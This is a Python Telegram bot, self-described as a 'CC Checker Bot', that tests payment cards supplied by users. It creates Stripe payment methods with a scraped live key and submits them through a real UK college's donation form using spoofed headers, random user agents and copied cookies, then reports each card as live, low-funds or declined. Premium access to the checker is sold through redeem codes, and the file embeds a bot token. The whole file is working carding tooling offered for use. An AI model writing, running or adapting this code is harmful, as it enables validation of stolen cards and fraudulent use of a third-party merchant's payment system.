import requests
import random
import string
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import uuid
from user_agent import generate_user_agent
import time

# Replace with your Telegram bot token
TELEGRAM_TOKEN = "8147133247:AAG13E5wI62DucNttY3KN5W9iqR3cxL_jws"

# Define the path for the database
DATABASE_PATH = 'database.txt'

# Load user data from the database
def load_user_data():
    user_data = {}
    if os.path.exists(DATABASE_PATH):
        with open(DATABASE_PATH, 'r') as f:
            for line in f:
                user_id, status = line.strip().split(',')
                user_data[int(user_id)] = status
    return user_data

# Save user data to the database
def save_user_data(user_data):
    with open(DATABASE_PATH, 'w') as f:
        for user_id, status in user_data.items():
            f.write(f"{user_id},{status}\n")

# Load initial user data
user_status = load_user_data()

def get_bin_info(cc):
    bin_number = cc[:6]  # Get the first 6 digits of the card number
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        data = response.json()
        return data
    except Exception:
        return None


# Store redeem codes dynamically
redeem_codes = {}

# List of admin user IDs
admin_ids = [6473717870]  # Replace with your Telegram user ID for admin access

# Command to register a user
async def register(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id

    # Check if user is already registered
    if user_id in user_status:
        await update.message.reply_text("You are already registered.")
        return

    # Register the user as FREE by default
    user_status[user_id] = "free"
    save_user_data(user_status)  # Save updated user status to database
    await update.message.reply_text("You have been registered successfully as a FREE user.")

def check_card(cc, cvv, mes, ano):
    start_time = time.time()
    
    try:
        # Simulated Tele function (you can replace this with the actual function)
        last = str("Simulated Tele function result")  # Replace this with actual Tele function
    except Exception as e:
        last = 'Error'

    # Get BIN information
    data = get_bin_info(cc)
    
    # Initialize variables
    brand = 'Unknown'
    card_type = 'Unknown'
    country = 'Unknown'
    country_flag = 'Unknown'
    bank = 'Unknown'

    # Extract BIN info with error handling
    if data:
        brand = data.get('brand', 'Unknown')
        card_type = data.get('type', 'Unknown')
        country = data.get('country_name', 'Unknown')
        country_flag = data.get('country_flag', 'Unknown')
        bank = data.get('bank', 'Unknown')
    
    end_time = time.time()
    guid = str(uuid.uuid4())    
    muid = str(uuid.uuid1())    
    sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
    time_on_page = random.randint(1, 30000)
    numbers = ''.join(random.choices('1234567890', k=random.randint(2, 4)))
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=70a18235-71ad-4004-8d22-37144e6724bdd6c9e5&sid=412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+card-element&referrer=https%3A%2F%2Flcfp.org.uk&time_on_page=34225&key=pk_live_51P05UI025m4Jgyco4Z31uNDfzsKpF2B5Okh5UrmyjJT2WQIvcrmVtKzVYxIx0EeY0g0toCMp34rUvjbYZdOhHdgw00unAXSyH0'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        id = response.json()['id']
    except:
        pass


    cookies = {
    '_ga': 'GA1.1.566870207.1729729114',
    'cookieyes-consent': 'consentid:RWYwZmZ1dE00UWRLQkFuNXZ5VzI0bndlQjZmMFh5c24,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
    '__stripe_mid': '70a18235-71ad-4004-8d22-37144e6724bdd6c9e5',
    '__stripe_sid': '412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6',
    'burst_uid': '6b69561f23235981e2d138aacc00093f',
    '_ga_YPC0KVCX1L': 'GS1.1.1729729114.1.1.1729729149.0.0.0',
    '_gcl_au': '1.1.1407270234.1729729121.925242018.1729729121.1729729149',
}

    headers = {
    'authority': 'lcfp.org.uk',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://lcfp.org.uk',
    'referer': 'https://lcfp.org.uk/pay-now/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    't': '1729729149991',
}

    data = f'data=ak_hp_textarea%3D%26ak_js%3D1729729113626%26__fluent_form_embded_post_id%3D6355%26_fluentform_7_fluentformnonce%3D08f6e8ca3e%26_wp_http_referer%3D%252Fpay-now%252F%26dropdown_2%3DLevel%25203%2509Diploma%2520in%2520Business%2520Management%2520603%252F7795%252F1%26input_radio%3DOnline%26input_radio_1%3DPay%2520in%2520Full%2520(One%2520Time%2520Fee)%26names%255Bfirst_name%255D%3Dthu%26names%255Blast_name%255D%3Dra%26email%3Dthur34355%2540gmail.com%26phone%3D%252B63676400%26address_1%255Baddress_line_1%255D%3DStreet%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DDZ%26dropdown_1%3DHigh%2520School%2520Diploma%26payment_input%3D0.50%26payment_method%3Dstripe%26payment_method_1%3Dstripe%26ak_bib%3D1729729124945%26ak_bfs%3D1729729148573%26ak_bkpc%3D8%26ak_bkp%3D23%253B23%252C10%253B17%252C6%253B17%252C5%253B17%252C5%253B16%252C5%253B16%252C4%253B16%252C5%253B%26ak_bmc%3D2%253B2%252C2848%253B3%252C2092%253B7%252C1634%253B15%252C2265%253B16%252C3636%253B5%252C3838%253B5%252C3566%253B11%252C13490%253B%26ak_bmcc%3D9%26ak_bmk%3D%26ak_bck%3D%26ak_bmmc%3D0%26ak_btmc%3D9%26ak_bsc%3D9%26ak_bte%3D210%253B72%252C1007%253B87%252C680%253B2%252C1327%253B10%252C1%253B84%252C1538%253B85%252C1291%253B333%252C205%253B78%252C284%253B118%252C2098%253B122%252C655%253B311%252C27%253B88%252C229%253B358%252C2851%253B61%252C559%253B82%252C745%253B597%252C200%253B166%252C687%253B164%252C313%253B83%252C563%253B120%252C1330%253B1%252C12154%253B%26ak_btec%3D22%26ak_bmm%3D%26__stripe_payment_method_id%3D{id}&action=fluentform_submit&form_id=7'
    try:
        response = requests.post('https://lcfp.org.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        # Simulate checking logic and response based on the response from Stripe API
        response_json = response.json()
        response_text = response.text.lower()
        if response_json.get('success') == True:
            # Simulated charge response
            charge_amount = "$10"
            charge_to = "$0"
            charge_status = "✅ Your card was charged successfully."
            card_info = {}
        elif 'your card has insufficient funds' in response_text:
        	# Simulated charge response
            charge_amount = "$10"
            charge_to = "$0"
            charge_status = "✅ Your card has insufficient funds"
            card_info = {}
        elif 'your card does not support' in response_text:
        	# Simulated charge response
            charge_amount = "$10"
            charge_to = "$0"
            charge_status = "✅ live card"
            card_info = {}
        else:
            charge_amount = "$10"
            charge_to = "$0"
            charge_status = "❌ Your card was declined."
            card_info = {}

        # Constructing detailed response
        result_message = (
        f"Checking your card:\n"
        f"➧ {cc}|{mes}|{ano}|{cvv}\n"
        f"𝐶ℎ𝑎𝑟𝑔𝑒 $0 𝑡𝑜 $10:\n\n"
        f"{charge_status}\n"
        f"======== [ INFO CC ] ========\n"
        f"➧ Brand: {brand}\n"
        f"➧ Type: {card_type}\n"
        f"➧ Country: {country} {country_flag}\n"
        f"➧ Bank: {bank}\n"
        f"======== [ Timing Info ] ========\n"
        f"➧ Total time: {end_time - start_time:.2f} seconds\n"
        f"➧ User: Thu [6473717870]\n"  
        f"Bot By : @chk1212 Thura\n"
    )
        return result_message

    except requests.RequestException as e:
        return f"Request failed: {e}"

# Command to check card (premium-only command)
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id

    # Check if user is premium
    if user_status.get(user_id) != "premium":
        await update.message.reply_text("This feature is available for premium users only.")
        return

    if len(context.args) < 1:
        await update.message.reply_text("Usage: /chk card_number|exp_month|exp_year|cvc")
        return

    # Splitting the input into respective parts
    try:
        card_info = context.args[0].split('|')
        if len(card_info) != 4:
            raise ValueError("Incorrect number of arguments.")

        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        cvc = card_info[3]

        # Inform the user that the card is being checked
        checking_message = await update.message.reply_text(f"Im checking your cc [Thu]:\n{card_number}|{exp_month}|{exp_year}|{cvc}")

        # Perform the card check
        result = check_card(card_number, cvc, exp_month, exp_year)

        # Edit the checking message with the result
        await context.bot.edit_message_text(chat_id=update.effective_chat.id,
                                             message_id=checking_message.message_id,
                                             text=result)

    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}\nUsage: /chk card_number|exp_month|exp_year|cvc")


# Command to generate a redeem code
async def code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id

    # Check if the user is an admin
    if user_id not in admin_ids:
        await update.message.reply_text("You do not have permission to generate codes.")
        return

    # Generate a random 10-character code
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    redeem_codes[code] = "premium"  # Add code to redeem codes list

    await update.message.reply_text(f"Generated premium redeem code: {code}")

# Command to redeem a code and upgrade user to premium
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id

    if len(context.args) < 1:
        await update.message.reply_text("Usage: /redeem CODE")
        return

    code = context.args[0]

    if code in redeem_codes and redeem_codes[code] == "premium":
        user_status[user_id] = "premium"
        save_user_data(user_status)  # Save updated user status to database
        await update.message.reply_text("You are now a premium user! Enjoy the exclusive features.")
        del redeem_codes[code]  # Remove the code after successful use
    else:
        await update.message.reply_text("Invalid redeem code.")

# Command to check if a user is premium
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    status = user_status.get(user_id, "free")
    await update.message.reply_text(f"Your current status is: {status.capitalize()}")

# Command to welcome users
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = (
        "Welcome to the CC Checker Bot!\n"
        "Here you can check credit cards and manage your premium features.\n"
        "Use /chk to check a card (premium feature).\n"
        "Use /register to register.\n"
        "Use /code to generate a redeem code (admin only).\n"
        "Use /redeem to redeem your code.\n"
        "Use /status to check your premium status."
    )
    await update.message.reply_text(welcome_message)

if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))  # Added start command handler
    application.add_handler(CommandHandler("register", register))  # Added registration command
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("code", code))  # Command to generate code
    application.add_handler(CommandHandler("redeem", redeem))  # Command to redeem code
    application.add_handler(CommandHandler("status", status))  # Command to check status

    application.run_polling()  # Start the bot
